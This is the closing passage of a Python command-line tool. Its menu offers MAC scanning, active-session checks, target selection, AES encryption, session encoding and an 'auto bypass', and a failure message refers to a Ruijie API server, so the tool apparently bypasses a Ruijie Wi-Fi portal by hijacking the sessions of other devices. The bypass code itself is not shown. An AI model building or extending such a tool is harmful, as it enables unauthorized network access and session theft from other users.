        print(f"\n{RED}╔══════════════════════════════════════╗{RESET}")
        print(f"{RED}║   ALL {total} MAC(s) BYPASS FAILED  ✗   ║{RESET}")
        print(f"{RED}╚══════════════════════════════════════╝{RESET}")
        print(f"{YELLOW}[!] Tips:{RESET}")
        print(f"{DG}  • Run Option 3 again to refresh active sessions{RESET}")
        print(f"{DG}  • Re-scan (Option 2) to find new devices{RESET}")
        print(f"{DG}  • Check internet — Ruijie API server must be reachable{RESET}")
        input(f"\n{YELLOW}[!] Press Enter...{RESET}")

# ==================== MAIN ====================
def main():
    try:
        subprocess.run(["adb", "start-server"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
    expiry = load_expiry() or key_screen()
    while True:
        print_menu(expiry)
        ch = input(f"{DW}  Select Option: {RESET}").strip()
        if   ch == "0": break
        elif ch == "1": option_wifi_setup(expiry)
        elif ch == "2": option_mac_scan(expiry)
        elif ch == "3": option_active_check(expiry)
        elif ch == "4": option_select_target(expiry)
        elif ch == "5": option_aes_encrypt(expiry)
        elif ch == "6": option_encode_session(expiry)
        elif ch == "7": option_auto_bypass(expiry)
        else:
            time.sleep(0.5)

if __name__ == "__main__":
    main()
